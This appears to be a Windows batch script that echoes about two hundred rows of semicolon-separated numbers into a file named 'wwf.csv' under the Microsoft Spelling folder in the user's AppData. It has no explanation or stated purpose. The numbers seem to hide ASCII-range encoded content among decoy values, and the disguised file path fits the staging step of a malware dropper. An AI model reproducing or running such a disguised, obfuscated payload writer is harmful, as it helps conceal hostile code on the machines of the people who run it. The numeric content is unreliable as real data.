>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.0;578.0;7045.769;0.784;0.552;0.3560;656.0;582.0;469.0;4410.476;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.749;0.40;0.3467;50.0;748.0;78.0;7043.71;0.373;0.810;0.7805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;801.0;814.0;1106.810;0.497;0.808;0.0507;578.0;397.0;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2375.801;0.40;0.819;0.8573;802.0;599.0;346.0;9097.801;0.820;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6695;30.0;830.0;447.0;8356.41;0.376;0.801;0.3431;803.0;497.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;8409.667;0.811;0.812;0.8477;821.0;814.0;805.0;9480.803;0.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.7628;60.0;869.0;532.0;1576.377;0.805;0.699;0.2896;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;815.0;2402.811;0.802;0.816;0.0242;332.0;367.0;811.0;4953.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;0.811;0.3881;814.0;597.0;816.0;9376.805;0.811;0.810;0.9484;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(646.0;332.0;532.0;1404.765;0.808;0.808;0.0847;532.0;814.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3239.803;0.804;0.816;0.8833;815.0;632.0;814.0;9065.801;0.815;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7836;814.0;818.0;801.0;8206.800;0.346;0.70;0.7239;40.0;556.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(68.0;6921.61;0.679;0.814;0.0096;805.0;803.0;805.0;2236.810;0.697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.8146;570.0;805.0;808.0;5581.801;0.810;0.497;0.0960;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;40.0;1026.819;0.802;0.399;0.9003;646.0;801.0;820.0;2746.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.684;0.5916;626.0;71.0;380.0;2941.814;0.811;0.800;0.5231;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;799.0;816.0;4666.378;0.597;0.809;0.5852;801.0;60.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7431.577;0.805;0.399;0.6910;814.0;811.0;815.0;3580.811;0.802;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3499;874.0;732.0;446.0;4984.578;0.669;0.484;0.8341;632.0;470.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;6915.397;0.809;0.801;0.4008;819.0;811.0;814.0;6377.807;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.458;0.4446;411.0;51.0;480.0;4232.814;0.811;0.800;0.5426;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(399.0;816.0;6274.586;0.801;0.814;0.6759;815.0;805.0;811.0;0536.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.452;0.1838;446.0;356.0;646.0;6259.551;0.557;0.550;0.2068;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(756.0;346.0;448.0;6482.30;0.50;0.352;0.5437;614.0;51.0;467.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7312.811;0.809;0.809;0.9961;801.0;810.0;816.0;3047.815;0.50;0.770;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1579;808.0;797.0;818.0;7289.811;0.814;0.461;0.5503;582.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;3107.697;0.805;0.808;0.5838;70.0;650.0;39.0;7701.41;0.680;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.9672;805.0;818.0;797.0;5584.816;0.801;0.466;0.2249;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;808.0;1348.800;0.40;0.768;0.2848;668.0;366.0;676.0;2401.668;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.652;0.557;0.3020;753.0;50.0;50.0;7615.468;0.50;0.41;0.2652;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(786.0;697.0;814.0;9457.370;0.805;0.808;0.1208;801.0;773.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5591.802;0.811;0.40;0.9642;70.0;536.0;74.0;7345.50;0.484;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6578;697.0;810.0;815.0;4577.808;0.797;0.816;0.6809;805.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;7895.30;0.30;0.69;4.4747;876.4;848.4;61.0;9851.932;4.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.1682;50.0;70.0;60.0;0861.660;97.815;115.801;109.4579;498.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.32;820.109;9480.808;110.815;61.734;117.4752;814.110;358.115;699.104;6403.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.797;115.745;109.0671;805.99;814.111;815.111;4824.802;116.545;99.811;109.6010;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(558.97;815.109;446.118;4556.649;34.432;109.397;110.1191;805.102;801.115;816.86;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8981.801;114.815;105.811;110.1035;661.34;749.46;448.34;5608.562;32.510;32.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.0465;532.32;732.32;332.60;7028.797;115.815;101.809;98.5742;808.121;373.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.110;9626.816;105.816;121.432;10.7193;432.32;732.32;332.32;4613.332;32.818;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.814;115.6781;805.111;810.61;434.52;8774.746;48.646;48.346;48.0520;634.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(310.32;732.32;6351.732;32.332;32.632;110.0696;697.109;801.61;734.119;5521.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.634;32.410;32.3470;432.32;532.32;632.47;9532.762;32.310;32.532;32.2958;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;732.60;816.114;8875.817;115.816;73.810;102.0029;811.32;820.109;808.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3767.815;61.634;117.814;110.5401;558.115;699.104;801.109;7666.697;115.345;109.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.6627;814.111;815.111;802.116;8096.445;99.811;109.558;97.7900;815.109;446.118;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(651.34;2621.662;32.410;32.332;32.8079;732.32;632.32;532.60;2941.815;101.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.814;105.8630;816.121;762.32;410.32;5071.532;32.632;32.632;32.9857;532.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.60;814.101;0363.813;117.801;115.816;101.2863;800.80;814.105;818.105;4599.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.803;101.815;62.2100;532.10;532.32;532.32;2117.432;32.432;32.532;32.8301;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.32;460.114;801.113;7830.817;101.815;116.801;100.4556;769.120;801.99;817.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9132.805;111.810;76.801;118.2086;801.108;432.10;632.32;6275.732;32.532;32.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.2633;532.32;732.32;532.32;8104.808;101.818;101.808;61.9769;334.97;815.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.118;8202.811;107.801;114.534;32.4817;510.32;332.32;632.32;9932.732;32.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.332;32.7491;432.32;532.117;805.65;0619.799;99.801;115.815;61.4542;334.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(597.108;815.101;1247.534;47.762;32.610;32.3913;432.32;532.32;732.32;4663.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.632;60.547;114.0015;801.113;817.101;815.116;2484.801;100.380;114.805;118.0525;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.108;801.103;801.115;9654.362;32.410;32.532;32.9851;632.32;632.32;532.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8631.647;115.801;99.817;114.7961;805.116;821.62;732.10;9304.732;32.532;32.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.6454;560.47;816.114;817.115;3743.816;73.810;102.811;62.7132;332.10;432.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;4760.332;32.460;99.811;109.1732;812.97;816.105;798.105;8672.808;105.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(121.332;120.1995;809.108;810.115;561.34;2682.817;114.810;58.815;99.8320;804.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.97;815.45;1792.809;105.599;114.811;115.3086;811.102;816.45;799.111;3087.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(58.399;111.809;112.5262;397.116;805.98;805.108;1370.805;116.821;46.818;49.4155;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(634.62;332.10;632.32;6407.332;32.332;32.332;32.9223;760.97;812.112;808.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2462.499;97.816;105.811;110.1569;762.32;310.32;632.32;4195.432;32.732;32.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.4855;632.60;733.45;545.32;6688.687;105.810;100.811;119.9143;815.32;386.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.116;8457.397;32.797;110.800;32.8549;783.101;814.118;801.114;8952.532;50.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.356;32.3733;745.45;562.32;710.32;7523.532;32.332;32.432;32.5379;632.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;310.32;9791.432;32.632;32.732;32.3875;432.32;432.60;815.117;7489.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.811;114.816;101.2930;800.79;483.32;673.100;5144.561;34.823;101.750;48.5687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.49;352.53;555.45;6512.549;53.352;54.545;52.2760;351.99;553.45;497.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0095.802;101.645;48.648;56.8955;800.101;801.101;451.100;1195.451;102.748;125.734;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.5275;347.62;432.10;332.32;1560.732;32.732;32.532;32.3688;332.32;760.33;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(745.45;1523.532;87.805;110.800;111.1399;819.115;532.55;732.97;4930.810;100.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.801;114.2802;818.101;814.32;750.48;2464.348;56.532;82.450;32.4792;445.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(662.32;310.32;9844.532;32.732;32.432;32.3994;332.32;732.32;710.32;9470.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.632;32.732;32.6038;532.32;332.60;815.117;8047.812;112.811;114.816;101.0169;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.79;783.32;373.100;6553.361;34.823;51.353;49.9980;351.56;798.57;797.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4675.353;100.757;54.445;52.7275;802.98;800.45;656.101;8149.450;100.445;97.750;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.4989;752.48;450.50;353.102;0095.357;51.497;125.434;32.4308;447.62;632.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;6548.432;32.332;32.532;32.1510;632.32;560.33;645.45;3230.532;87.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.800;111.5027;819.115;532.56;732.97;7325.810;100.632;83.801;114.6851;818.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.32;650.48;6496.349;50.332;45.445;62.3669;732.10;332.32;332.32;9229.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.532;32.732;32.5759;360.115;817.112;812.111;2759.814;116.801;100.379;83.3046;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.73;800.61;334.123;0698.552;97.750;102.650;56.6653;801.51;645.53;751.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5733.557;45.652;52.752;49.0706;545.98;697.57;399.45;9365.800;54.657;100.552;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.1539;652.97;554.101;551.56;6182.825;34.632;47.662;32.0925;510.32;332.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.32;0874.532;32.332;32.332;60.7110;333.45;545.32;387.105;9672.810;100.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.815;32.6280;556.46;349.32;340.66;1053.808;117.801;41.732;97.3183;810.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.83;801.114;9826.818;101.814;32.450;48.1134;349.50;532.82;550.45;1400.445;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.632;10.632;32.2524;532.32;632.32;632.32;6214.732;32.332;10.532;32.8203;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;532.32;632.32;0520.532;32.360;115.817;112.8528;812.111;814.116;801.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7578.779;83.632;73.800;61.4169;334.123;649.102;754.55;3790.554;99.755;54.745;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.5951;548.101;649.45;652.50;9844.551;57.745;57.553;98.9373;698.45;756.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.48;8767.802;54.800;48.800;97.0932;355.56;825.34;432.47;4046.562;32.610;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.732;32.5126;432.32;532.32;332.32;6047.432;60.733;45.645;32.6116;687.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.100;811.119;9012.815;32.384;104.814;101.2352;815.104;811.108;800.32;7200.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(45.645;62.732;10.4691;532.32;632.32;732.32;7624.632;32.432;32.332;10.9673;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.32;332.32;432.32;6658.732;32.432;32.560;115.3772;817.112;812.111;814.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7296.801;100.579;83.532;73.0751;800.61;434.123;656.101;1248.548;102.755;97.449;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.8881;445.98;802.98;651.45;7549.352;102.801;56.645;98.8831;657.97;653.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(752.56;2014.802;100.453;48.697;49.8299;453.97;557.97;825.34;1535.732;47.562;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.610;32.5527;332.32;532.32;532.32;2121.632;60.647;97.812;112.8509;808.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(499.97;816.105;2326.811;110.762;32.510;32.2432;432.32;632.32;432.60;4576.447;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.811;109.812;97.8616;816.105;798.105;808.105;0560.816;121.362;32.410;32.5582;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;532.60;647.97;3649.815;115.801;109.598;108.3043;821.62;70.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2197.40;0.70;0.40;0.2836;30.0;30.0;30.0;4565.60;0.30;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3400;40.0;70.0;50.0;3048.40;0.50;0.40;0.4929;70.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;9482.40;0.50;0.60;0.6599;40.0;30.0;50.0;8669.40;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.3352;60.0;50.0;60.0;4848.60;0.70;0.70;0.2745;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;60.0;6692.60;0.30;0.40;0.1380;50.0;50.0;30.0;8808.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;0.60;0.2450;70.0;30.0;70.0;1188.50;0.70;0.60;0.8994;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;30.0;30.0;8670.30;0.50;0.30;0.8532;40.0;70.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0043.30;0.50;0.70;0.9565;50.0;30.240;60.0;6328.312;0.30;0.616;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.3849;50.0;70.0;60.0;4580.50;0.50;0.50;0.9476;60.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;4918.30;0.30;0.60;0.5266;40.0;60.0;40.0;7727.50;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.4344;70.0;70.0;30.0;9747.60;0.60;0.40;0.1552;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;70.0;6506.60;0.50;0.70;0.9636;70.0;40.0;70.0;1185.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.40;0.5056;60.0;70.0;70.0;9524.30;0.60;0.40;0.5011;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;60.0;30.0;4801.70;0.60;0.60;0.4066;60.0;30.0;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7963.70;0.70;0.50;0.4936;70.0;70.0;60.0;6793.60;0.30;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5421;60.0;70.0;30.0;3171.40;0.50;0.40;0.5828;70.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;6246.40;0.60;0.60;0.8178;60.0;40.0;30.0;5796.60;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.8403;50.0;30.0;50.0;9309.70;0.70;0.30;0.2170;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;60.0;0743.50;0.70;0.50;0.2501;30.0;70.0;70.0;4705.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.30;0.4615;30.0;50.0;60.0;1635.40;0.50;0.50;0.2610;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;40.0;40.0;8604.60;0.60;0.30;0.2212;40.0;50.0;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4322.30;0.70;0.50;0.8381;30.0;40.0;50.0;0974.60;0.50;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8826;50.0;60.0;40.0;6778.60;0.70;0.60;0.7142;30.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;1991.60;0.60;0.30;0.8464;60.0;30.0;70.0;9235.30;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.9402;40.0;40.0;60.0;0190.40;0.60;0.30;0.1645;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;70.0;2329.70;0.60;0.40;0.0115;70.0;60.0;70.0;8172.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.30;0.1559;40.0;40.0;70.0;1299.30;0.60;0.60;0.8861;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;60.0;50.0;4698.70;0.40;0.50;0.9623;60.0;50.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4856.30;0.70;0.60;0.9791;60.0;50.0;40.0;9804.60;0.50;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2919;60.0;70.0;60.0;5844.50;0.50;0.50;0.8271;70.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;0066.40;0.50;0.60;0.2355;60.0;40.0;30.0;5140.50;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.0408;50.0;60.0;40.0;4477.60;0.40;0.70;0.6756;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;30.0;7438.40;0.40;0.70;0.1063;30.0;40.0;70.0;7017.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.50;0.8926;40.0;60.0;50.0;7599.30;0.30;0.70;0.4225;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;50.0;70.0;2927.30;0.40;0.30;0.0040;60.0;70.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5980.40;0.60;0.70;0.7788;40.0;60.0;40.0;2751.50;0.30;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3237;30.0;60.0;50.0;6868.70;0.30;0.40;0.2762;70.0;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;7174.50;0.60;0.868;65.1761;60.0;60.2;72.0;0016.648;130.665;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(156.36;9.0317;342.134;472.134;947.13;5765.41;7.42;160.830;65.5582;841.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(830.65;837.2;9625.41;1.649;11.648;9.7049;56.5;543.14;53.2;1298.526;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5.70;48.476;6.7349;710.43;56.1;44.1;9900.830;55.72;1.34;160.3638;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(362.48;760.48;423.6;1461.610;43.66;1.54;1.1200;830.55;72.1;715.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5259.79;3.41;0.860;4.8090;862.2;828.0;348.33;9728.748;9.46;5.443;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.9653;53.2;426.5;60.4;1263.620;24.922;22.940;29.3540;398.122;555.235;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(898.145;4418.568;89.651;183.918;149.6271;911.165;627.160;830.24;0946.806;48.830;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.918;48.7659;830.3;894.160;33.2;5990.51;2.52;19.751;0.7268;30.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.82;48.216;4963.923;65.905;231.882;0.7295;40.0;60.1;72.48;8058.513;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.49;42.834;72.3165;834.247;313.1;51.5;1859.35;0.648;119.649;11.0508;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(448.9;76.3;385.4;8430.56;19.42;85.683;49.4000;719.48;717.6;33.85;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2671.44;8.619;10.687;97.1480;815.104;805.110;803.116;8291.811;110.649;16.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.5697;76.3;785.4;67.19;4478.57;82.801;100.809;111.0472;810.100;349.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(548.28;0210.76;3.585;4.410;19.2386;321.77;805.99;814.111;0594.815;111.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.332;67.6037;811.114;812.111;814.97;9636.816;105.811;110.649;33.3776;348.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.3;385.4;9752.33;19.724;77.805;99.2541;814.111;815.111;802.116;4803.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(84.805;109.801;45.2671;483.116;797.109;812.32;8607.380;67.765;48.430;23.2677;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(613.49;656.48;456.50;6807.551;50.348;50.448;50.0867;450.90;323.13;449.57;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4647.749;49.450;51.350;48.3935;750.48;550.50;690.48;2636.829;202.449;11.548;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9.8903;36.3;485.4;66.19;6179.52;85.383;49.511;48.2100;79.6;33.85;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.8;3125.319;2.487;65.549;16.3889;648.14;66.3;485.4;1268.57;19.77;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(82.801;100.3935;809.111;810.100;549.30;5987.748;28.46;3.385;4.8062;610.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(321.77;805.99;8399.814;111.815;111.802;116.0434;732.67;811.114;812.111;9831.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.816;105.811;110.7960;549.45;648.43;76.3;7675.685;4.711;19.736;77.4772;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.99;814.111;815.111;9996.802;116.532;73.814;101.6726;808.97;810.100;632.79;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9748.812;101.814;97.816;105.1448;811.110;815.32;676.105;5450.809;105.816;101.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.5956;338.48;536.6;33.85;0072.54;11.719;29.684;104.0750;697.108;801.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.84;1008.483;83.532;69.383;78.9270;358.50;465.68;752.45;9307.452;66.357;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.345;70.6306;665.48;549.49;537.48;5489.335;6.63;85.64;3.3492;419.28;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(677.105;799.114;9021.811;115.811;102.816;32.8766;784.105;809.101;745.83;0412.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.809;112.632;115.9040;801.114;818.105;699.101;7090.648;130.51;34.648;13.7833;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.9;342.134;372.134;6132.947;13.51;1.71;5.2002;70.3;830.1;415.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4116.748;130.41;10.52;130.2940;41.1;30.182;576.37;3571.321;234.818;122.899;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(164.0701;393.66;618.180;321.231;0691.930;24.922;180.882;249.0398;901.25;869.182;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.125;8167.643;35.890;89.668;151.2058;826.146;939.168;906.20;0090.457;93.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.860;154.0681;559.212;861.153;387.210;0754.924;223.942;190.812;111.1465;951.106;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.44;885.84;9793.922;151.33;213.872;82.4249;624.77;856.191;860.13;2557.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(79.911;224.730;152.8167;848.15;55.37;855.129;2088.916;169.920;89.876;205.8140;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(663.137;922.189;362.18;9251.808;10.909;8.738;157.6861;905.165;899.53;429.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0506.915;95.838;0.310;196.4968;680.180;888.195;830.141;9899.808;83.930;94.915;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(229.3743;336.105;559.22;557.188;0834.780;110.714;152.884;233.9989;647.211;828.236;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(883.139;4409.898;125.882;62.918;240.0111;922.185;723.90;818.44;6402.905;223.897;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(241.931;12.9503;839.23;489.215;882.194;0430.898;19.920;122.861;25.9769;885.123;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(844.98;833.49;3104.866;157.870;4.928;203.4649;379.230;865.246;850.215;0568.375;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(126.930;166.694;84.2279;439.108;696.119;866.96;2169.431;191.877;114.868;215.8020;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(857.8;814.124;915.163;6287.672;186.923;152.843;51.9582;428.123;824.219;907.131;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5907.940;44.741;172.859;220.6851;883.130;819.0;830.79;3117.940;58.852;77.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(198.4740;813.127;828.149;819.138;2809.811;2.33;1.50;1.2408;863.130;71.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(348.130;5333.71;5.548;29.36;3.4050;485.29;614.4;422.4;3956.520;169.926;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(188.832;79.7446;327.211;939.196;824.95;1164.832;9.491;16.836;1.5680;393.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.48;431.6;6298.43;85.429;35.54;24.0389;648.22;828.20;335.52;9092.948;
